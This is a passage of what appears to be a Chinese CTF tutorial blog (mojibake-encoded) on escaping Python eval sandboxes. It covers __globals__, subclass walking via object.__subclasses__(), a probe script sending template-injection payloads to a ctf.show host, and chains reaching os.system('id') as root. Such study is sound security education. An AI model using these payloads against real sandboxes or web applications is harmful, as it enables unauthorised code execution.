<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = <span class="keyword">lambda</span>:<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__==foo.__globals__==<span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><code>__globals__</code> æ˜¯ç»‘å®šåœ¨å‡½æ•°ä¸Šçš„ï¼Œ<strong>æ— è®ºå‡½æ•°åœ¨ä½•å¤„è¢«è°ƒç”¨ï¼Œå®ƒçš„ <code>__globals__</code> éƒ½ä¸ä¼šå˜</strong>ï¼Œå§‹ç»ˆæŒ‡å‘å®šä¹‰å®ƒçš„æ¨¡å—ã€‚</p>
</li>
<li><p>æŸäº›å†…ç½®å‡½æ•°ï¼ˆå¦‚ <code>len</code>ã€<code>os.system</code>ï¼‰æ˜¯ C å®ç°çš„ï¼Œå®ƒä»¬<strong>æ²¡æœ‰ <code>__globals__</code> å±æ€§</strong>ã€‚</p>
</li>
</ul>

    </div>
  </div>

<h3 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h3><p><code>__init__</code> æ˜¯ç±»çš„â€œæ„é€ å™¨æ–¹æ³•â€ï¼Œåœ¨<strong>ç±»å®ä¾‹åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨</strong>ï¼Œç”¨äºåˆå§‹åŒ–å®ä¾‹çš„å±æ€§ã€‚</p>
<p>å¯¹è±¡çš„ <code>__init__</code> æ–¹æ³•åˆ†ä¸º<strong>â€œé»˜è®¤çš„â€</strong>å’Œ<strong>â€œé‡è½½è¿‡çš„â€</strong>ä¸¤ç§æƒ…å†µï¼š</p>
<ul>
<li><p>å¦‚æœä½  <strong>æ²¡æœ‰</strong>åœ¨ç±»é‡Œå®šä¹‰ <code>__init__</code>ï¼ŒPython ä¼šè‡ªåŠ¨ä»å…¶<strong>çˆ¶ç±»ç»§æ‰¿ä¸€ä¸ªé»˜è®¤çš„ <code>__init__</code> æ–¹æ³•</strong>ã€‚è¿™æ˜¯ <strong>å†…ç½®çš„ object ç±»</strong> æä¾›çš„é»˜è®¤ <code>__init__</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ª C å®ç°çš„â€œslot wrapperâ€ï¼Œä¸æ˜¯çœŸæ­£çš„ Python å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__init__</span><br><span class="line">&lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;object&#x27;</span> objects&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>å¦‚æœä½  <strong>å®šä¹‰äº†è‡ªå·±çš„ <code>__init__</code></strong> æ–¹æ³•ï¼Œåˆ™ä½ çœ‹åˆ°çš„å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ Python å‡½æ•°å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;init from B&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B.__init__)</span><br><span class="line"><span class="comment"># è¾“å‡º &lt;function B.__init__ at 0x...&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>å…¶ä¸­é»˜è®¤çš„ <code>__init__</code> æ˜¯ C å®ç°çš„ slot wrapperï¼Œæ²¡æœ‰ <code>__globals__</code> å±æ€§ï¼›è€Œåªæœ‰<strong>Python å†™çš„å‡½æ•°</strong>æ‰æœ‰ <code>__globals__</code>ï¼Œæ‰èƒ½é€šè¿‡å®ƒæ¥æ‰¾åˆ°å¯¼å…¥çš„æ¨¡å—ã€‚</p>
<p>å› æ­¤åœ¨æ²™ç®±é€ƒé€¸ä¸­å¸¸å¸¸éœ€è¦å¯»æ‰¾ä¸€ä¸ªæ‹¥æœ‰é‡è½½ <code>__init__</code> çš„å¯¹è±¡ï¼Œç„¶åé€šè¿‡ <code>obj.__init__.__globals__</code> æ¥è·å¾—è¯¥å¯¹è±¡çš„æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ã€‚åœ¨è¿™ä¸ªå…¨å±€å…¨å±€å‘½åç©ºé—´ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾å›è¢«æ²™ç®±åˆ é™¤æ‰çš„ <code>__builtins__</code>ã€<code>os</code> ç­‰æ¨¡å—ã€‚</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>å®é™…ä¸Šåœ¨æ²™ç®±é€ƒé€¸ä¸­ï¼Œæˆ‘ä»¬ä¸ä¸€å®šè¦ç”¨ <code>__init__</code> å‡½æ•°çš„ <code>__globals__</code> å±æ€§æ¥è·å–æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ï¼Œå…¶ä»–å‡½æ•°ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<ul>
<li><code>__del__</code>ï¼šä¸€ä¸ªç±»çš„ææ„å‡½æ•°ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</li>
<li><code>__str__</code> &#x2F; <code>__repr__</code>ï¼šç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚<code>__str__</code> åœ¨ä½¿ç”¨ <code>str()</code> æˆ– <code>print()</code> æ—¶è°ƒç”¨ï¼Œ<code>__repr__</code> åœ¨ä½¿ç”¨ <code>repr()</code> æˆ–äº¤äº’å¼è§£é‡Šå™¨æ—¶è°ƒç”¨ã€‚å¦‚æœæœªå®šä¹‰ <code>__str__</code>ï¼Œåˆ™é»˜è®¤ä½¿ç”¨ <code>__repr__</code>ã€‚</li>
<li><code>__eq__</code> &#x2F; <code>__ne__</code> &#x2F; <code>__lt__</code> &#x2F; <code>__gt__</code> &#x2F; <code>__le__</code> &#x2F; <code>__ge__</code>ï¼šå®šä¹‰å¯¹è±¡ä¹‹é—´çš„æ¯”è¾ƒæ“ä½œï¼Œå¦‚ç­‰äºã€ä¸ç­‰äºã€å°äºã€å¤§äºã€å°äºç­‰äºã€å¤§äºç­‰äºã€‚</li>
<li><code>__add__</code> &#x2F; <code>__sub__</code> &#x2F; <code>__mul__</code> &#x2F; <code>__div__</code> &#x2F; <code>__mod__</code> &#x2F; <code>__pow__</code>ï¼šå®šä¹‰åŸºæœ¬æ•°å­¦è¿ç®—ç¬¦çš„è¡Œä¸ºï¼Œå¦‚åŠ ã€å‡ã€ä¹˜ã€é™¤ã€å–æ¨¡ã€å¹‚è¿ç®—ç­‰ã€‚</li>
<li><code>__getitem__</code> &#x2F; <code>__setitem__</code> &#x2F; <code>__delitem__</code>ï¼šå®šä¹‰å¯¹è±¡é€šè¿‡ç´¢å¼•è®¿é—®ã€èµ‹å€¼å’Œåˆ é™¤çš„è¡Œä¸ºï¼Œæ”¯æŒç±»ä¼¼åˆ—è¡¨ã€å­—å…¸çš„æ“ä½œã€‚</li>
<li><code>__iter__</code> &#x2F; <code>__next__</code>ï¼šå®šä¹‰å¯¹è±¡çš„è¿­ä»£è¡Œä¸ºï¼Œæ”¯æŒ <code>for</code> å¾ªç¯æˆ–æ‰‹åŠ¨è°ƒç”¨ <code>next()</code>ã€‚</li>
<li><code>__call__</code>ï¼šå…è®¸å®ä¾‹åƒå‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ï¼Œå³æ”¯æŒ <code>obj()</code> è¿™æ ·çš„è¯­æ³•ã€‚</li>
<li><code>__getattr__</code> &#x2F; <code>__setattr__</code> &#x2F; <code>__delattr__</code>ï¼šç”¨äºæ‹¦æˆªå±æ€§çš„è®¿é—®ã€è®¾ç½®å’Œåˆ é™¤æ“ä½œï¼Œå¸¸ç”¨äºè‡ªå®šä¹‰å¯¹è±¡å±æ€§ç®¡ç†é€»è¾‘ã€‚</li>
</ul>

    </div>
  </div>

<h1 id="æ— -builtins-ç»•è¿‡"><a href="#æ— -builtins-ç»•è¿‡" class="headerlink" title="æ—  builtins ç»•è¿‡"></a>æ—  builtins ç»•è¿‡</h1><h2 id="é—®é¢˜èƒŒæ™¯"><a href="#é—®é¢˜èƒŒæ™¯" class="headerlink" title="é—®é¢˜èƒŒæ™¯"></a>é—®é¢˜èƒŒæ™¯</h2><p>åœ¨æŸäº› <strong>Python æ²™ç®±æ‰§è¡Œç¯å¢ƒ</strong>ä¸­ï¼Œä¸ºäº†é˜²æ­¢ç”¨æˆ·æ‰§è¡Œå±é™©æ“ä½œï¼Œä¼šé€šè¿‡ä¸‹é¢çš„æ–¹å¼æ¸…ç©º <code>__builtins__</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;...&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·åšçš„æ•ˆæœæ˜¯ï¼š</p>
<ul>
<li>é˜»æ­¢äº†è®¿é—® <code>print</code>, <code>eval</code>, <code>open</code>, <code>__import__</code>, <code>object</code> ç­‰å†…ç½®å‡½æ•°&#x2F;ç±»ï¼›</li>
<li>å³ä½¿å†™äº† <code>&quot;__import__(&#39;os&#39;)&quot;</code>ï¼Œä¹Ÿä¼šæŠ¥é”™ï¼šå› ä¸ºä½ è®¿é—®ä¸åˆ° <code>__import__</code> å‡½æ•°äº†ã€‚</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ Python ä¸­ï¼Œ<code>eval(expr, globals=None, locals=None)</code>ï¼ˆä»¥åŠ <code>exec</code>ï¼‰çš„å‚æ•°è§£æè§„åˆ™æ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li><p>å¦‚æœä½ æ˜¾å¼ä¼ å…¥äº† <code>globals</code> å‚æ•°ï¼Œå¹¶ä¸”å®ƒæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä½†å…¶ä¸­<strong>æ²¡æœ‰</strong>é”® <code>__builtins__</code>ï¼Œè§£é‡Šå™¨ä¼š<strong>è‡ªåŠ¨æ’å…¥</strong>ä¸€ä»½ <code>__builtins__</code>ï¼ˆé€šå¸¸æ˜¯å¯¹å†…ç½®æ¨¡å— <code>builtins</code> çš„å¼•ç”¨ï¼‰ã€‚</p>
</li>
<li><p>å› æ­¤ï¼Œä»…ä»…å°† <code>globals</code>&#x2F;<code>locals</code> ä¼ å…¥<strong>ç©ºå­—å…¸</strong>ï¼Œå¹¶ä¸èƒ½æŠ¹æ‰å†…å»ºå‡½æ•°å’Œå¯¹è±¡ï¼›å®ƒä»¬ä¼šè¢«è‡ªåŠ¨è¡¥å›ã€‚ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;&#125;)  <span class="comment"># âœ… æ­£å¸¸è¾“å‡º 2ï¼Œå› ä¸ºè‡ªåŠ¨è¡¥å›äº† builtins</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>å¦‚æœä½ æƒ³é˜»æ­¢è®¿é—®å†…å»ºå¯¹è±¡ï¼Œéœ€è¦<strong>æ˜¾å¼è¦†ç›–</strong> <code>__builtins__</code>ï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)   <span class="comment"># âŒ NameError: len</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;)  <span class="comment"># âŒ NameError: __import__</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ä½ ä¹Ÿå¯ä»¥æ”¾ä¸€ä¸ª<strong>ç™½åå• dict</strong> ä½œä¸º <code>__builtins__</code>ï¼Œåªå…è®¸æœ‰é™çš„å†…å»ºå‡½æ•°ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;print(&#x27;ok&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;)  <span class="comment"># âœ… åªèƒ½ç”¨ print</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<p>ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;python-input-0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure></div>

<p>ç„¶è€Œä¸Šè¿°ç¤ºä¾‹ä¸­<strong>æ¸…ç©ºçš„ <code>__builtins__</code> æ˜¯â€œæ‰§è¡Œç¯å¢ƒâ€çš„ï¼Œè€Œä¸æ˜¯å‡½æ•°å®šä¹‰æ—¶ä¿å­˜çš„ç¯å¢ƒ</strong>ã€‚</p>
<p>è¿™æ˜¯å› ä¸ºä¸€ä¸ª Python å‡½æ•°å¯¹è±¡ï¼Œåœ¨å®ƒ<strong>å®šä¹‰çš„æ—¶å€™</strong>ï¼Œè§£é‡Šå™¨å°±ä¼šæŠŠå®ƒçš„å®šä¹‰ç¯å¢ƒï¼ˆå³å®ƒæ‰€åœ¨æ¨¡å—çš„ <code>globals()</code>ï¼‰ä¿å­˜è¿› <code>func.__globals__</code> é‡Œäº†ã€‚ä¹Ÿå°±æ˜¯è¯´å°±ç®—ä¹‹åä½ æ‰‹åŠ¨åˆ æ‰äº† <code>globals()[&#39;__builtins__&#39;]</code>ï¼Œè¿™ä¸ªå¼•ç”¨ä¹Ÿæ—©å°±å­˜ç€åŸæ¥çš„å†…å®¹äº†ï¼ˆæŒ‡å‘ builtins æ¨¡å—ï¼‰ã€‚</p>
<p>å› æ­¤è¿™ç§æƒ…å†µä¸‹éœ€è¦é€šè¿‡æŸç§æ–¹å¼æ‰¾å› <code>__builtins__</code>ï¼Œç„¶å<strong>é‡æ–°è·å¾—å¯¹å†…ç½®å‡½æ•°ï¼ˆå¦‚ <code>__import__</code>, <code>open</code>, <code>eval</code>, <code>os.system</code>ï¼‰çš„è®¿é—®æƒ</strong>ï¼Œä»¥ä¾¿æ‰§è¡Œå‘½ä»¤ã€è¯»å–æ–‡ä»¶ç­‰ã€‚</p>
<h2 id="é€šè¿‡å†…çœæœºåˆ¶ç»•è¿‡"><a href="#é€šè¿‡å†…çœæœºåˆ¶ç»•è¿‡" class="headerlink" title="é€šè¿‡å†…çœæœºåˆ¶ç»•è¿‡"></a>é€šè¿‡å†…çœæœºåˆ¶ç»•è¿‡</h2><p>Python æ˜¯é«˜åº¦<strong>è‡ªå</strong>ï¼ˆReflectiveï¼‰å’Œ<strong>åŠ¨æ€</strong>çš„è¯­è¨€ã€‚å³ä½¿ä½ åˆ æ‰äº† <code>__builtins__</code>ï¼Œç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­åˆ›å»ºçš„å¯¹è±¡ã€ç±»ã€æ¨¡å—ç­‰éƒ½ä¾ç„¶<strong>ä¿å­˜åœ¨å†…å­˜ä¸­å¹¶å¯ä»¥è¢«è®¿é—®</strong>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>ç±»å‹ç³»ç»Ÿå’Œç»§æ‰¿ç»“æ„</strong>ï¼Œå»â€œç¿»â€åˆ°è¿™äº›å¯¹è±¡ã€‚</p>
<h3 id="è·å–-object-ç±»"><a href="#è·å–-object-ç±»" class="headerlink" title="è·å– object ç±»"></a>è·å– object ç±»</h3><p>Python ä¸­æ‰€æœ‰å¯¹è±¡çš„åŸºç±»æ˜¯ <code>object</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»ä»»æ„å¯¹è±¡å‡ºå‘ï¼Œæ‹¿åˆ° <code>object</code>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="è·å–-object-çš„å¯ç”¨å­ç±»"><a href="#è·å–-object-çš„å¯ç”¨å­ç±»" class="headerlink" title="è·å– object çš„å¯ç”¨å­ç±»"></a>è·å– object çš„å¯ç”¨å­ç±»</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç±»çš„ <code>__subclasses__</code> æ–¹æ³•è·å– <code>object</code> çš„æ‰€æœ‰å­ç±»ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">object</span>.__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, ...]</span><br></pre></td></tr></table></figure></div>

<p>è¿™å°±æ˜¯å†…å­˜ä¸­ç°å­˜çš„ç±»å¯¹è±¡ã€‚æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™äº›å­ç±»ä¸­å¯»æ‰¾ä¸€ä¸ªæœ‰æ²¡æœ‰é‡è½½è¿‡ <code>__init__</code> çš„ç±»ï¼Œä»¥ä¾¿é€šè¿‡ <code>__init__.__globals__</code> æ‰¾åˆ° <code>os</code> æˆ– <code>builtins</code> æ¨¡å—ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wrapper&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i].__init__):</span><br><span class="line">        <span class="built_in">print</span> (i, <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure></div>

<p>å¯¹äºè¿œç¨‹ç¯å¢ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¾ªç¯å‘åŒ…è¯·æ±‚æ¥æ¢æµ‹å¯ç”¨ç±»åœ¨ <code>object.__subclasses__()</code> ä¸­çš„ä¸‹æ ‡ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦ç”¨ SSL éªŒè¯è­¦å‘Š</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://14fba753-0bb4-47e2-bc11-9341f5e11d10.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">probe_index</span>(<span class="params">index</span>):</span><br><span class="line">    payload = quote(<span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[<span class="subst">&#123;index&#125;</span>].__init__&#125;&#125;&#125;&#125;&quot;</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/?name=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found subclass at index <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    --&gt; <span class="subst">&#123;resp.text.strip()[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error on index <span class="subst">&#123;index&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        probe_index(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="globals-ä¸­çš„å¯ç”¨æ¨¡å—"><a href="#globals-ä¸­çš„å¯ç”¨æ¨¡å—" class="headerlink" title="globals ä¸­çš„å¯ç”¨æ¨¡å—"></a>globals ä¸­çš„å¯ç”¨æ¨¡å—</h3><p>Python <strong>å‡½æ•°å¯¹è±¡</strong>æœ‰ <code>__globals__</code> å±æ€§ï¼Œä¿å­˜äº†å‡½æ•°å®šä¹‰æ‰€åœ¨æ¨¡å—çš„<strong>å…¨å±€å‘½åç©ºé—´</strong>ã€‚å†…ç½®æ¨¡å—ï¼ˆ<code>builtins</code>ï¼‰æˆ–å¯¼å…¥çš„æ¨¡å—ï¼ˆå¦‚ <code>os</code>ï¼Œ<code>sys</code>ï¼‰å¸¸å¸¸åœ¨é‡Œé¢ã€‚</p>
<h4 id="builtins-æ¨¡å—-1"><a href="#builtins-æ¨¡å—-1" class="headerlink" title="builtins æ¨¡å—"></a>builtins æ¨¡å—</h4><p>ä¾‹å¦‚ <code>warnings.catch_warnings</code> æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ä¸­æœ‰ <code>__builtins__</code> æ¨¡å—ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å·²ç»æ‰¾å› <code>__builtins__</code> æ¨¡å—ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>ä½¿ç”¨è¯¥æ¨¡å—çš„ <code>__import__</code> å‡½æ•°å¯¼å…¥ <code>os</code> æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤ï¼›</li>
<li>æˆ–è€…é€šè¿‡è¯¥æ¨¡å—çš„ <code>eval</code> å‡½æ•°ç›´æ¥æ‰§è¡Œ python è„šæœ¬ã€‚</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
